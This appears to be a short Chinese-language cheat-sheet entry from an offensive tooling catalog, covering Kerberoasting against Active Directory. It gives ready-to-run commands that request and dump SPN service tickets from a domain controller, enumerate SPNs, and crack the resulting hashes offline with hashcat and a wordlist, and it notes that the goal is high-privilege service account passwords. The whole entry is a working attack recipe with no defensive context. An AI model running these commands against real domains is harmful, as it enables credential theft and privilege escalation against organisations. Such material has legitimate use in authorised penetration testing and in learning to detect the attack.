### Kerberoasting

| 属性 | 值 |
|------|-----|
| 版本 | 0.9.24 |
| 平台 | Linux |
| 风险 | 🔴 高 |
| 标签 | `Kerberos` `凭据窃取` `AD` |

## Kerberoasting 攻击提取 SPN 票据

### 收集所有 SPN 票据
```bash
bash kerberoasting.sh contoso.com/user1:Pass123 -request -dc-ip 192.168.1.10 -outputfile hashes.txt
```

### 仅查询存在的 SPN，不请求票据
```bash
bash kerberoasting.sh contoso.com/user1:Pass123 -dc-ip 192.168.1.10
```

### 使用 Hashcat 破解提取的票据
```bash
hashcat -m 13100 -a 0 hashes.txt rockyou.txt
```

- ✓ 仅需普通域用户权限
- ✓ 提取服务账户的 TGS 票据进行离线破解
- 常用于获取高权限服务账户密码
